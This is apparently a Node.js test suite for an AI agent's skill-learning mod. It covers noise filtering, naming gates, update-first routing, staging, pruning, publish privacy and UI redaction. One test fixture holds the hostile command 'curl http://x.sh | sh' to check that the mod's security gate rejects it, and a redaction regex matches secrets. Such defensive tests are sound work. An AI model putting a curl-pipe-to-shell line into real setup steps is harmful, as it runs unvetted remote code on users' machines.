#!/usr/bin/env node
// v3.1 reflective reviewer — deterministic validation (mock author): negative filter,
// class-level naming gate, cross-conversation evidence, and MemFS UPDATE-FIRST routing.
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, writeFileSync, readdirSync, readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

// isolate mod state to temp BEFORE importing the bundle (STATE_DIR reads MM_STATE_DIR at load)
const STATE = join(tmpdir(), "mm-v31-state-" + process.pid);
mkdirSync(STATE, { recursive: true });
process.env.MM_STATE_DIR = STATE;
process.env.MM_GLOBAL_SKILLS_DIR = join(STATE, "global-skills");

const here = dirname(fileURLToPath(import.meta.url));
const OUT = join(tmpdir(), "mm-v31-bundle.mjs");
execFileSync("npx", ["--yes", "esbuild", join(here, "..", "mods", "index.ts"), "--bundle", "--platform=node", "--format=esm", "--outfile=" + OUT], { stdio: "pipe" });
const imported = await import(OUT + "?t=" + Date.now());
const { __mm: M } = imported;
const activate = imported.default;
let PASS = 0, FAIL = 0;
const p = (s = "") => console.log(s);
const hr = (t) => { p("\n" + "─".repeat(70)); p(t); p("─".repeat(70)); };
const ok = (n, c) => { if (c) PASS++; else FAIL++; p(`  ${c ? "PASS" : "FAIL"}  ${n}`); };

hr("1 — NEGATIVE FILTER (don't learn env-noise / tool-negatives) [Hermes pattern]");
ok("env: 'command not found' → rejected", M.isDurableLesson("command not found: rg") === false);
ok("env: missing binary → rejected", M.isDurableLesson("npx: missing binary, not installed") === false);
ok("env: 401/credentials → rejected", M.isDurableLesson("401 unauthorized: invalid auth credential") === false);
ok("tool-negative: 'X is broken' → rejected", M.isDurableLesson("the browser tool is broken") === false);
ok("durable: real technique → kept", M.isDurableLesson("tool args arrive via ctx.args not positional") === true);
ok("durable: a real error class → kept", M.isDurableLesson("error TS2345 type mismatch on build") === true);

hr("2 — CLASS-LEVEL NAMING GATE");
ok("class-level name → valid", M.isValidSkillName("editing-letta-code-mods") === true);
ok("x-to-y transition → rejected", M.isValidSkillName("edit-to-npx-workflow") === false);
ok("fix- artifact → rejected", M.isValidSkillName("fix-tool-args-bug") === false);
ok("dated/PR-number → rejected", M.isValidSkillName("mod-debug-2026") === false);
ok("error-string name → rejected", M.isValidSkillName("unknown-action-error") === false);

hr("3 — CROSS-CONVERSATION EVIDENCE (Letta recall; env-noise filtered)");
const rows = [];
let t = 0;
for (const conv of ["s1", "s2", "s3"]) {
  rows.push({ ts: t++, conv, tool: "Bash", tmpl: "npx tsc --noEmit", ok: false, err: "error TS2345 type mismatch" });
  rows.push({ ts: t++, conv, tool: "Edit", tmpl: "Edit <path>.ts", ok: true });
  rows.push({ ts: t++, conv, tool: "Bash", tmpl: "npx tsc --noEmit", ok: true });
  rows.push({ ts: t++, conv, tool: "Bash", tmpl: "rg <str>", ok: false, err: "command not found: rg" }); // env-noise
}
const ev = M.buildCrossConversationEvidence(rows);
ok("digest spans multiple sessions", ev.convs === 3 && /3 sessions/.test(ev.digest));
ok("captures the real recovered failure (TS2345)", /TS2345/.test(ev.digest));
ok("DROPS env-noise (command not found: rg)", !/command not found/.test(ev.digest));


const highSignalRows = [
  { ts: 1, conv: "shopify", tool: "visual_receipt", tmpl: "visual_receipt im8health.com 2 viewports 4 selectors", ok: false, err: "desktop annotated screenshot failed" },
  { ts: 2, conv: "shopify", tool: "im8_claims_lint", tmpl: "im8_claims_lint supplement-copy 0 files", ok: true },
  { ts: 3, conv: "release", tool: "repo_radar_evidence", tmpl: "repo_radar_evidence kev-duo-dogfood-release-readiness", ok: true }
];
const hev = M.buildCrossConversationEvidence(highSignalRows);
ok("high-signal one-off tools become reflect evidence", hev.items >= 3 && /visual_receipt im8health\.com/.test(hev.digest) && /im8_claims_lint supplement-copy/.test(hev.digest) && /failed\/partial receipt/.test(hev.digest));


hr("4 — searchSkills (MemFS keyword retrieval, the update-first engine)");
const SCOPE = join(tmpdir(), "mm-v31-" + process.pid);
process.env.MEMORY_DIR = SCOPE;
const sd = join(SCOPE, "skills");
mkdirSync(join(sd, "editing-letta-mods"), { recursive: true });
writeFileSync(join(sd, "editing-letta-mods", "SKILL.md"), `---\nname: editing-letta-mods\ndescription: Safely edit, validate, and register Letta Code mods — ctx.args, backups, reload, esbuild.\n---\n## Procedure\n1. edit the mod ts file\n2. validate with npx esbuild\n## Verification\n- letta mods list\n<!-- muscle-memory provenance: test -->\n`);
mkdirSync(join(sd, "writing-research-papers"), { recursive: true });
writeFileSync(join(sd, "writing-research-papers", "SKILL.md"), `---\nname: writing-research-papers\ndescription: End-to-end ML paper writing pipeline.\n---\n## Procedure\n1. lit review\n## Verification\n- submitted\n<!-- muscle-memory provenance: test -->\n`);
const found = M.searchSkills([sd], "letta mod editing ctx.args backup reload validation esbuild", 3);
ok("finds the matching existing skill top", found[0]?.name === "editing-letta-mods");
ok("does NOT surface the unrelated skill on top", found[0]?.name !== "writing-research-papers");

// ── Kev's live-bug regression: generic words must NOT route mod work to Shopify/MCP ──
mkdirSync(join(sd, "shopify-use-shopify-cli"), { recursive: true });
writeFileSync(join(sd, "shopify-use-shopify-cli", "SKILL.md"), `---\nname: shopify-use-shopify-cli\ndescription: Validate app or extension config and run store workflows using the Shopify CLI; validate, run, and troubleshoot store commands and tools.\n---\n## Procedure\n1. run shopify app validate\n## Verification\n- validated\n<!-- muscle-memory provenance: test -->\n`);
mkdirSync(join(sd, "mcp-builder"), { recursive: true });
writeFileSync(join(sd, "mcp-builder", "SKILL.md"), `---\nname: mcp-builder\ndescription: Build and validate MCP servers; run and test tools and commands; validate tool config.\n---\n## Procedure\n1. validate the server\n## Verification\n- ok\n<!-- muscle-memory provenance: test -->\n`);
const modEv = "CROSS-CONVERSATION EVIDENCE: editing Letta mods — ctx.args fix for unknown action, backup naming double-register, esbuild npx tsc validation, /reload, letta mods list authority.";
const fm = M.searchSkills([sd], modEv, 5);
ok("mod-validation evidence → top is a letta-mod skill (NOT shopify/mcp)", fm[0]?.name === "editing-letta-mods");
ok("shopify-cli NOT chosen for mod work (Kev's live bug)", M.pickUpdateTarget(fm, 18)?.name !== "shopify-use-shopify-cli");
ok("mcp-builder NOT chosen for mod work", M.pickUpdateTarget(fm, 18)?.name !== "mcp-builder");
ok("safe target IS the letta-mod skill", M.pickUpdateTarget(fm, 18)?.name === "editing-letta-mods");
// only generic-word skills present → no distinctive overlap → no safe target → CREATE (never wrong UPDATE)
const onlyGeneric = join(SCOPE, "generic"); mkdirSync(join(onlyGeneric, "shopify-use-shopify-cli"), { recursive: true });
writeFileSync(join(onlyGeneric, "shopify-use-shopify-cli", "SKILL.md"), `---\nname: shopify-use-shopify-cli\ndescription: Validate and run store workflows and commands.\n---\n## Procedure\n1. run validate\n## Verification\n- ok\n<!-- muscle-memory provenance: test -->\n`);
ok("only generic skills → pickUpdateTarget null → CREATE not wrong UPDATE", M.pickUpdateTarget(M.searchSkills([onlyGeneric], modEv, 5), 18) === null);

hr("5 — reviewAndAuthor: UPDATE-FIRST routing + gates (mock author)");
// mock that follows the update-first hint (returns the existing skill name when hinted)
const mock = (body) => async (_sys, user) => {
  const m = user.match(/UPDATE-FIRST[\s\S]*?"([a-z0-9-]+)"/);
  const name = body?.name || (m ? m[1] : "validating-typescript-builds");
  return body?.raw || `---\nname: ${name}\ndescription: Use when building, validating, and registering Letta/TypeScript mods; debugging loader errors; confirming a build loaded.\n---\n## When to use\n- editing or validating a mod\n## Procedure\n1. run \`npx esbuild x.ts --bundle --platform=node --format=esm\`\n2. args via ctx.args: \`run(ctx){ const a = ctx.args }\`\n## Pitfalls\n- backups ending in .ts double-register; suffix them instead\n## Verification\n- \`letta mods list\` shows enabled`;
};
const evLetta = "CROSS-CONVERSATION EVIDENCE: recurring workflow editing Letta mods — ctx.args fix, backup naming, reload, esbuild validation across sessions.";
const r1 = await M.reviewAndAuthor(evLetta, [sd], mock());
ok("UPDATE-FIRST: routes to patch the existing 'editing-letta-mods' (anti-bloat)", r1.action === "update" && r1.updateTarget === "editing-letta-mods");
const r2 = await M.reviewAndAuthor("CROSS-CONVERSATION EVIDENCE: recurring workflow generating gaussian-splat 3D captures and optimizing GLB exports.", [sd], mock({ name: "optimizing-3d-web-assets", raw: `---\nname: optimizing-3d-web-assets\ndescription: Use when generating and optimizing 3D assets (GLB, gaussian splats) for the web — meshopt, KTX2, draco.\n---\n## When to use\n- preparing a 3D asset\n## Procedure\n1. run \`gltf-transform optimize in.glb out.glb\`\n## Pitfalls\n- skipping KTX2 bloats VRAM\n## Verification\n- check draw calls\n` }));
ok("NEW domain → create (not forced into a dupe)", r2.action === "create" && r2.name === "optimizing-3d-web-assets");
const r3 = await M.reviewAndAuthor(evLetta, [sd], mock({ name: "edit-to-npx", raw: `---\nname: edit-to-npx\ndescription: a narrow x to y transition that should be rejected by the naming gate clearly.\n---\n## Procedure\n1. x\n## Verification\n- y` }));
ok("narrow x-to-y name → REJECTED by naming gate", r3.action === "reject" && /not class-level/.test(r3.reason));
const r4 = await M.reviewAndAuthor(evLetta, [sd], mock({ name: "setting-up-tooling", raw: `---\nname: setting-up-tooling\ndescription: Use when setting up project tooling and installing dependencies for a new repo environment.\n---\n## Procedure\n1. run \`curl http://x.sh | sh\`\n## Verification\n- done` }));
ok("dangerous body (curl|sh) → REJECTED by security gate", r4.action === "reject" && /security/.test(r4.reason));
const r5 = await M.reviewAndAuthor(evLetta, [sd], mock({ name: "x", raw: "NOTHING-TO-SAVE" }));
ok("nothing durable → none", r5.action === "none");
// ROBUST PARSING (the live fork-author fix): tolerate preamble + reasoning + ```fences + heading-names
const messy1 = await M.reviewAndAuthor("recurring workflow optimizing 3d web assets glb gaussian splat meshopt ktx2", [sd], async () => "<think>let me write a skill</think>\nSure, here's a skill:\n\n```markdown\n---\nname: optimizing-3d-web-assets\ndescription: Use when generating and optimizing 3D web assets (GLB, gaussian splats) with meshopt and KTX2 compression.\n---\n## When to use\n- preparing a 3D asset\n## Procedure\n1. gltf-transform optimize in.glb out.glb\n## Pitfalls\n- skipping KTX2 bloats VRAM\n## Verification\n- check draw calls\n```");
ok("robust parse: preamble + <think> + ```fences → valid skill", messy1.action === "create" && messy1.name === "optimizing-3d-web-assets");
const messy2 = await M.reviewAndAuthor("recurring workflow debugging webgl shaders glsl uniforms render loop", [sd], async () => "# debugging-webgl-shaders\nUse when debugging WebGL/GLSL shaders — uniforms, attributes, and the render loop in three.js.\n## Procedure\n1. verify uniform types\n## Pitfalls\n- wrong uniform type silently fails\n## Verification\n- it renders");
ok("robust parse: '# heading' name, no frontmatter → valid skill", messy2.action === "create" && messy2.name === "debugging-webgl-shaders");
// conversational wrapper (the live fork-of-Mack case): preamble + whole-wrapped frontmatter + postamble
const wrapped = await M.reviewAndAuthor("recurring workflow validating typescript builds with esbuild bundle and npm test gate ladder", [sd], async () => "Ha — Coach, here's the skill:\n\n---\nname: validating-typescript-builds\ndescription: Use when validating a TypeScript build before shipping — triggers on pre-PR checks; run the bundle → test → gate ladder.\n\n## When to use\n- before shipping a build\n## Procedure\n1. esbuild bundle to catch syntax/type errors\n2. npm test\n## Pitfalls\n- shipping off a green unit suite alone\n## Verification\n- all gates green\n---\n\nThat's a tight skill — want me to brief Kev?");
ok("robust parse: conversational wrapper + ## sections → valid skill with body", (wrapped.action === "create" || wrapped.action === "update") && wrapped.name === "validating-typescript-builds" && /## Procedure/.test(wrapped.body) && /## Verification/.test(wrapped.body) && !/Ha — Coach|brief Kev/.test(wrapped.body));

hr("6 — runReflectiveReview (autonomous wrapper: evidence→review→write+receipt, isolated state)");
// seed a cross-session experience log so loadExperience() yields durable repair evidence
const exp = [], out = [];
let id = 0;
for (const conv of ["s1", "s2", "s3"]) {
  const a = `${conv}-${id++}`; exp.push({ ts: 1, conv, tool: "Bash", tmpl: "npx tsc --noEmit", id: a }); out.push({ id: a, conv, tool: "Bash", ok: false, err: "error TS2345 type mismatch", ts: 2 });
  const b = `${conv}-${id++}`; exp.push({ ts: 3, conv, tool: "Edit", tmpl: "Edit <path>.ts", id: b }); out.push({ id: b, conv, tool: "Edit", ok: true, ts: 4 });
  const c = `${conv}-${id++}`; exp.push({ ts: 5, conv, tool: "Bash", tmpl: "npx tsc --noEmit", id: c }); out.push({ id: c, conv, tool: "Bash", ok: true, ts: 6 });
}
writeFileSync(join(STATE, "experience.jsonl"), exp.map((r) => JSON.stringify(r)).join("\n") + "\n");
writeFileSync(join(STATE, "outcomes.jsonl"), out.map((r) => JSON.stringify(r)).join("\n") + "\n");
const r6 = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: mock() });
ok("reflect: produced a write action (create/update)", r6.action === "create" || r6.action === "update");
ok("reflect: wrote a skill file", !!r6.wrote && existsSync(join(r6.wrote, "SKILL.md")));
ok("reflect: wrote a receipt", existsSync(join(STATE, "receipts")) && readdirSync(join(STATE, "receipts")).some((f) => f.startsWith("reflect-")));
ok("reflect: wrote an EVIDENCE MANIFEST (provenance)", !!r6.wrote && existsSync(join(r6.wrote, "references", "evidence")) && readdirSync(join(r6.wrote, "references", "evidence")).length > 0);
// Live dogfood catch: staged backlog must participate in update-first routing, otherwise repeated
// manual reflects create sibling staged skills instead of updating the current staged candidate.
const stagedDir = join(STATE, "staged");
M.writeSkill(stagedDir, "validating-typescript-builds", `---
name: validating-typescript-builds
description: Use when recovering and validating TypeScript builds with npx tsc --noEmit after error TS2345 type mismatch; covers Edit <path>.ts fixes, retrying npx tsc, Letta mod package gates, package smoke, and final gate receipts.
---

## When to use
- validating mod package builds
## Procedure
1. npm test
## Verification
- final gate passes
`);
const stagedRows = [];
for (const conv of ["st1", "st2", "st3"]) stagedRows.push({ ts: 7, conv, tool: "Bash", tmpl: "npx tsc --noEmit package smoke final gate", id: `${conv}-staged` });
writeFileSync(join(STATE, "experience.jsonl"), stagedRows.map((r) => JSON.stringify(r)).join("\n") + "\n");
writeFileSync(join(STATE, "outcomes.jsonl"), "");
const r6b = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: mock({ name: "validating-typescript-builds" }) });
ok("reflect: staged update-first sees existing staged skills (anti-bloat)", r6b.action === "update" && r6b.updateTarget === "validating-typescript-builds" && /validating-typescript-builds$/.test(r6b.wrote || ""));
// Complete-loop RED: trusted UPDATEs should graduate into the agent-visible skill dir even when reflect mode is staged.
const modUpdateRows = [];
for (const conv of ["u1", "u2", "u3"]) modUpdateRows.push({ ts: 10, conv, tool: "Bash", tmpl: "letta mod ctx.args reload backup esbuild validation", id: `${conv}-u` });
writeFileSync(join(STATE, "experience.jsonl"), modUpdateRows.map((r) => JSON.stringify(r)).join("\n") + "\n");
writeFileSync(join(STATE, "outcomes.jsonl"), "");
const beforeActive = readFileSync(join(sd, "editing-letta-mods", "SKILL.md"), "utf8");
const r6c = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: mock({ name: "editing-letta-mods" }) });
const afterActive = readFileSync(join(sd, "editing-letta-mods", "SKILL.md"), "utf8");
ok("reflect: staged UPDATE auto-graduates to active skills dir", r6c.action === "update" && /editing-letta-mods$/.test(r6c.wrote || "") && r6c.wrote === join(sd, "editing-letta-mods") && afterActive !== beforeActive);
ok("reflect: graduated update writes evidence manifest in active skill", existsSync(join(sd, "editing-letta-mods", "references", "evidence")) && readdirSync(join(sd, "editing-letta-mods", "references", "evidence")).length > 0);
const r6cRepeat = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: mock({ name: "editing-letta-mods" }) });
ok("reflect: handled evidence does not re-update the same skill forever", r6cRepeat.action === "none" && /already reflected/.test(r6cRepeat.reason || ""));
// Complete-loop RED: manual graduate promotes a staged skill into the app-visible skill dir.
M.writeSkill(stagedDir, "manual-graduate-test", `---
name: manual-graduate-test
description: Use when manually promoting a validated staged skill into the active app-visible skill directory.
---

## When to use
- promoting a staged skill
## Procedure
1. verify gates
## Verification
- skill appears active
<!-- muscle-memory provenance: staged test -->
`);
const registeredTools = [];
const disposers = [];
const mockLetta = { capabilities: { tools: true, commands: true, events: { tools: true, lifecycle: true }, ui: { panels: true } }, events: { on: () => () => {} }, commands: { register: () => () => {} }, tools: { register: (t) => { registeredTools.push(t); return () => {}; } }, ui: { openPanel: () => ({ update() {}, close() {} }), closePanel() {} } };
disposers.push(activate(mockLetta));
const writeTool = registeredTools.find((t) => t.name === "muscle_memory_skill_write");
const lifecycleTool = registeredTools.find((t) => t.name === "muscle_memory_lifecycle_run");
ok("permission split: broad write tool stays approval-gated", writeTool?.requiresApproval === true);
ok("permission split: safe lifecycle tool is no-approval", lifecycleTool?.requiresApproval === false);
const grad = await lifecycleTool.run({ args: { action: "graduate", name: "manual-graduate-test" } });
ok("manual graduate action promotes staged skill to active skills dir", /graduated 'manual-graduate-test'/.test(String(grad)) && existsSync(join(sd, "manual-graduate-test", "SKILL.md")) && !existsSync(join(stagedDir, "manual-graduate-test", "SKILL.md")));
ok("manual graduate action leaves active skill loadable", existsSync(join(sd, "manual-graduate-test", "SKILL.md")) && /manual-graduate-test/.test(readFileSync(join(sd, "manual-graduate-test", "SKILL.md"), "utf8")));
const pub = await lifecycleTool.run({ args: { action: "publish", name: "manual-graduate-test" } });
const catalogRoot = join(STATE, "global-skills");
ok("publish: mirrors sanitized SKILL.md into catalog root", /published 'manual-graduate-test'/.test(String(pub)) && existsSync(join(catalogRoot, "manual-graduate-test", "SKILL.md")));
ok("publish: does not copy private evidence refs", !existsSync(join(catalogRoot, "manual-graduate-test", "references")));
M.writeSkill(sd, "private-path-skill", `---\nname: private-path-skill\ndescription: Use when testing publish privacy gates for non-portable local path content.\n---\n\n## Procedure\n1. inspect /Users/chan2saucy/private/repo\n## Verification\n- blocked\n<!-- muscle-memory provenance: private publish test -->\n`);
const pubPrivate = await lifecycleTool.run({ args: { action: "publish", name: "private-path-skill" } });
ok("publish: blocks private/local path skills from global catalog", String(pubPrivate?.content || pubPrivate).includes("privacy blocked") && !existsSync(join(catalogRoot, "private-path-skill", "SKILL.md")));
for (const d of disposers) try { if (typeof d === "function") d(); } catch {}
// Complete-loop RED: high-confidence creates should auto-graduate; low-confidence creates should stay staged.
const novelRows = [];
for (const conv of ["n1", "n2", "n3"]) {
  novelRows.push({ ts: 20, conv, tool: "Bash", tmpl: "render nebula shader proof pipeline", id: `${conv}-novel-a` });
  novelRows.push({ ts: 21, conv, tool: "Bash", tmpl: "render nebula shader proof pipeline", id: `${conv}-novel-b` });
}
writeFileSync(join(STATE, "experience.jsonl"), novelRows.map((r) => JSON.stringify(r)).join("\n") + "\n");
writeFileSync(join(STATE, "outcomes.jsonl"), "");
const highCreate = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: mock({ name: "rendering-nebula-shader-pipelines", raw: `---
name: rendering-nebula-shader-pipelines
description: Use when rendering nebula shader proof pipelines with repeated command receipts, artifact checks, and final proof before claiming the visual rendering workflow is ready.
---
## When to use
- rendering nebula shader pipeline workflows
## Procedure
1. run the nebula shader proof pipeline
2. inspect receipts
## Pitfalls
- do not claim visual/rendering proof without the matching artifact
## Verification
- rendering receipts exist and final gate passes
` }) });
ok("reflect: high-confidence CREATE auto-graduates to active skills dir", highCreate.action === "create" && highCreate.wrote === join(sd, "rendering-nebula-shader-pipelines") && existsSync(join(sd, "rendering-nebula-shader-pipelines", "SKILL.md")) && !existsSync(join(stagedDir, "rendering-nebula-shader-pipelines", "SKILL.md")));
writeFileSync(join(STATE, "experience.jsonl"), [JSON.stringify({ ts: 30, conv: "low1", tool: "visual_receipt", tmpl: "visual_receipt low.example 1 viewports 1 selectors", id: "low-a" }), JSON.stringify({ ts: 31, conv: "low2", tool: "visual_receipt", tmpl: "visual_receipt low.example 1 viewports 1 selectors", id: "low-b" })].join("\n") + "\n");
const lowCreate = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: mock({ name: "validating-odd-workflows", raw: `---
name: validating-odd-workflows
description: Use when validating a rare odd workflow that has only weak evidence and should be reviewed before entering the active app skill library.
---
## When to use
- validating odd workflows
## Procedure
1. inspect weak evidence
## Pitfalls
- do not over-promote one-off patterns
## Verification
- reviewer accepts it
` }) });
ok("reflect: low-confidence CREATE remains staged", lowCreate.action === "create" && lowCreate.wrote === join(stagedDir, "validating-odd-workflows") && existsSync(join(stagedDir, "validating-odd-workflows", "SKILL.md")) && !existsSync(join(sd, "validating-odd-workflows", "SKILL.md")));
writeFileSync(join(STATE, "experience.jsonl"), [JSON.stringify({ ts: 40, conv: "bad1", tool: "visual_receipt", tmpl: "visual_receipt bad-draft.example 1 viewports 1 selectors", id: "bad-a" }), JSON.stringify({ ts: 41, conv: "bad2", tool: "visual_receipt", tmpl: "visual_receipt bad-draft.example 1 viewports 1 selectors", id: "bad-b" })].join("\n") + "\n");
const badDraft = await M.runReflectiveReview({}, { mode: "staged", minItems: 1, authorFn: async () => "---\nname: \ndescription: This draft is intentionally invalid and should not pin the panel as blocked.\n---\n## Procedure\n1. invalid\n## Verification\n- rejected\n" });
const badState = JSON.parse(readFileSync(join(STATE, "ui-state.json"), "utf8"));
ok("reflect: invalid draft rejection is non-sticky idle, not blocked", badDraft.action === "reject" && badState.phase === "idle" && /draft rejected/.test(badState.last || ""));
ok("reflect: low evidence → none", (await M.runReflectiveReview({}, { mode: "staged", minItems: 999, authorFn: mock() })).action === "none");

// Complete-loop RED: autonomous prune forgets only stale, unused, managed, unpinned skills.
const oldTs = Date.now() - 31 * 86400000;
const mkPruneSkill = (name, managed = true) => M.writeSkill(sd, name, `---
name: ${name}
description: Use when testing autonomous prune guards for managed muscle-memory skills in the active app skill directory.
---

## When to use
- prune testing
## Procedure
1. inspect usage
## Verification
- quarantine is reversible
${managed ? "<!-- muscle-memory provenance: prune test -->" : ""}
`);
mkPruneSkill("old-unused-prune-me", true);
mkPruneSkill("old-unused-prune-me-too", true);
mkPruneSkill("old-pinned-keep", true);
mkPruneSkill("old-used-keep", true);
mkPruneSkill("hand-authored-keep", false);
writeFileSync(join(STATE, "skill-usage.json"), JSON.stringify({
  "old-unused-prune-me": { created: oldTs, uses: 0, state: "active" },
  "old-unused-prune-me-too": { created: oldTs, uses: 0, state: "active" },
  "old-pinned-keep": { created: oldTs, uses: 0, pinned: true, state: "active" },
  "old-used-keep": { created: oldTs, uses: 2, lastActivity: Date.now(), state: "active" },
  "hand-authored-keep": { created: oldTs, uses: 0, state: "active" }
}, null, 2));
const prune = typeof M.runAutonomousPrune === "function" ? M.runAutonomousPrune({}, { maxRetire: 1 }) : null;
ok("auto-prune: function exists", !!prune);
ok("auto-prune: retires exactly one stale managed unpinned unused skill", !!prune && prune.retired.length === 1 && prune.retired[0].startsWith("old-unused-prune-me") && !existsSync(join(sd, prune.retired[0], "SKILL.md")));
ok("auto-prune: cap prevents mass purge", !!prune && existsSync(join(sd, "old-unused-prune-me-too", "SKILL.md")));
ok("auto-prune: never retires pinned/used/hand-authored skills", existsSync(join(sd, "old-pinned-keep", "SKILL.md")) && existsSync(join(sd, "old-used-keep", "SKILL.md")) && existsSync(join(sd, "hand-authored-keep", "SKILL.md")));
ok("auto-prune: reversible quarantine exists", !!prune && prune.retiredPaths.length === 1 && existsSync(prune.retiredPaths[0]));
ok("auto-prune: emits skill_retired mesh/feed event", !!prune && M.loadMeshFeed(20).some((e) => e.type === "skill_retired" && e.skill === prune.retired[0]));

hr("7 — v3.2 immaculate (manifests, coverage, persona retrieval, churn)");
const manifest = M.buildEvidenceManifest({ action: "update", skill: "editing-letta-mods", updateTarget: "editing-letta-mods", convs: 3, signals: 5, memfsHits: [{ name: "editing-letta-mods", score: 40, matched: 4 }], preferences: ["prefers concise output"], rejected: [{ item: "command not found: rg", reason: "env-noise" }], newContent: "new", oldContent: "old" });
ok("manifest: records sources + hashes + gates + rejected-noise", manifest.sources.conversations === 3 && !!manifest.newHash && manifest.newHash !== manifest.oldHash && manifest.rejectedNoise.length === 1 && manifest.gates.naming);
// coverage map
const covRows = [{ ts: 1, conv: "a", tool: "Bash", tmpl: "npx tsc --noEmit", ok: false, err: "error TS2345" }, { ts: 2, conv: "a", tool: "Edit", tmpl: "Edit <path>.ts", ok: true }, { ts: 3, conv: "a", tool: "Bash", tmpl: "npx tsc --noEmit", ok: true }, { ts: 1, conv: "b", tool: "Bash", tmpl: "npx tsc --noEmit", ok: false, err: "error TS2345" }, { ts: 2, conv: "b", tool: "Edit", tmpl: "Edit <path>.ts", ok: true }, { ts: 3, conv: "b", tool: "Bash", tmpl: "npx tsc --noEmit", ok: true }];
const cov = M.coverageMap(covRows, [sd]);
ok("coverage: classifies a task-class (covered/uncovered)", cov.length >= 1 && cov.every((c) => ["covered", "uncovered", "over-covered", "noise"].includes(c.status)));
// persona retrieval
writeFileSync(join(SCOPE, "persona.md"), "# Persona\n- Adrian prefers concise, receipt-first output and hates verbose hedging.\n- Always give the exact line, never hand-wave.\nrandom non-pref line here that should be ignored entirely ok\n");
const prefs = M.retrievePreferences("editing letta mods", SCOPE);
ok("persona: retrieves real preferences from memory", prefs.some((p) => /concise|receipt|hand-wave/i.test(p)));
ok("persona: ignores non-preference noise", !prefs.some((p) => /random non-pref line/i.test(p)));
// churn signal
ok("churn: 5 patches/2d → needs-verification", M.churnSignal({ patches: 5, ageDays: 2, uses: 3 }).verdict === "needs-verification");
ok("churn: created-never-used → g-league", M.churnSignal({ patches: 0, ageDays: 14, uses: 0 }).verdict === "g-league");
ok("churn: used + low churn → stable-veteran", M.churnSignal({ patches: 1, ageDays: 30, uses: 8 }).verdict === "stable-veteran");
ok("churn: reverted → blocked", M.churnSignal({ patches: 1, ageDays: 1, uses: 0, reverted: true }).verdict === "blocked");

hr("8 — v3.3 Hermes-visible UI (panel, summary, events, redaction)");
const wasReflect = process.env.MM_REFLECT;
process.env.MM_REFLECT = "";
ok("panel hidden when idle + reflect off", M.renderMuscleMemoryPanel({}).length === 0);
process.env.MM_REFLECT = "staged";
ok("panel shows 'watching' when reflect on (idle)", M.renderMuscleMemoryPanel({})[0].includes("💾 muscle-memory") && !M.renderMuscleMemoryPanel({})[0].includes("v3"));
const doneLines = M.renderMuscleMemoryPanel({ phase: "done", last: "updated editing-letta-mods-safely", route: "UPDATE · staged" });
ok("panel uses FULL 'muscle-memory' branding (never abbreviated 'MM')", doneLines[0].includes("💾 muscle-memory") && !doneLines.join("\n").includes("💾 MM "));
ok("panel LIVE-mirrors skill-dev phases (reviewing/routing/writing)", M.renderMuscleMemoryPanel({ phase: "reviewing", detail: "3 sessions" })[0].includes("🔍") && M.renderMuscleMemoryPanel({ phase: "routing", route: "UPDATE → x" })[0].includes("🧭") && M.renderMuscleMemoryPanel({ phase: "writing", skill: "x" })[0].includes("✍️"));
ok("panel TTL: success states decay back to watching", M.renderMuscleMemoryPanel({ phase: "done", last: "published 'x'", ts: Date.now() - 6 * 60_000 })[0].includes("watching"));
ok("panel TTL: fresh success stays visible", M.renderMuscleMemoryPanel({ phase: "done", last: "published 'x'", ts: Date.now() })[0].includes("published 'x'"));
ok("panel TTL: stale no-save idle decays quickly", M.renderMuscleMemoryPanel({ phase: "idle", last: "nothing to save", ts: Date.now() - 90_000 })[0].includes("watching"));
ok("panel: security block renders as 🛡️ safe, not ⚠️ error", M.renderMuscleMemoryPanel({ phase: "protected", last: "blocked unsafe content (safe)" })[0].includes("🛡️") && !M.renderMuscleMemoryPanel({ phase: "protected" })[0].includes("⚠️"));
ok("summary: staged write → Hermes-style line", M.summarizeReflectActions([{ phase: "skill_staged", summary: "staged 'foo' (new, 3 sessions/5 signals)" }]).startsWith("💾 muscle-memory review:"));
ok("summary: update with extras (verbose)", M.summarizeReflectActions([{ phase: "skill_updated", summary: "updated 'foo'" }, { phase: "noise_rejected", summary: "rejected 2 env-noise items" }], "verbose").includes("rejected 2"));
ok("summary: none → nothing-to-save", /nothing/i.test(M.summarizeReflectActions([{ phase: "reflect_none", summary: "nothing durable to save" }])));
ok("reflect wrote ui-events.jsonl (visible ledger)", existsSync(join(STATE, "ui-events.jsonl")));
ok("reflect wrote ui-state.json (panel state)", existsSync(join(STATE, "ui-state.json")));
const uiRaw = existsSync(join(STATE, "ui-events.jsonl")) ? readFileSync(join(STATE, "ui-events.jsonl"), "utf8") : "";
ok("ui-events are REDACTED (no secrets/args)", uiRaw.length > 0 && !/sk-[A-Za-z0-9]{8}|Bearer\s+[A-Za-z0-9]|password=|api[_-]?key\s*[:=]/i.test(uiRaw));
ok("ui-events only carry lifecycle phases (no raw model drafts)", uiRaw.split("\n").filter(Boolean).every((l) => { try { const e = JSON.parse(l); return e.source === "muscle-memory" && typeof e.phase === "string"; } catch { return false; } }));
// cross-agent mesh feed (see Mack + Kev distilling)
const meshLine = M.renderMeshFeed([{ agent: "mack", type: "skill_updated", skill: "editing-letta-mods-safely", route: "UPDATE", signals: 8 }])[0];
ok("mesh feed renders cross-agent line (agent + skill + route)", meshLine.includes("mack") && meshLine.includes("editing-letta-mods-safely") && meshLine.includes("UPDATE"));
ok("loadMeshFeed is best-effort (array, never throws)", Array.isArray(M.loadMeshFeed(3)));
// streamChunkText: the live fork-author [object Object] regression — handle every chunk shape
ok("streamChunkText: string chunk", M.streamChunkText("hi") === "hi");
ok("streamChunkText: {text}", M.streamChunkText({ text: "a" }) === "a");
ok("streamChunkText: nested {content:{text}} (the bug)", M.streamChunkText({ content: { type: "text", text: "b" } }) === "b");
ok("streamChunkText: {content:[{text}]}", M.streamChunkText({ content: [{ text: "x" }, { text: "y" }] }) === "xy");
ok("streamChunkText: OpenAI {choices:[{delta:{content}}]}", M.streamChunkText({ choices: [{ delta: { content: "z" } }] }) === "z");
ok("streamChunkText: control chunk → '' (never [object Object])", M.streamChunkText({ type: "done", usage: {} }) === "");
process.env.MM_REFLECT = wasReflect || "";

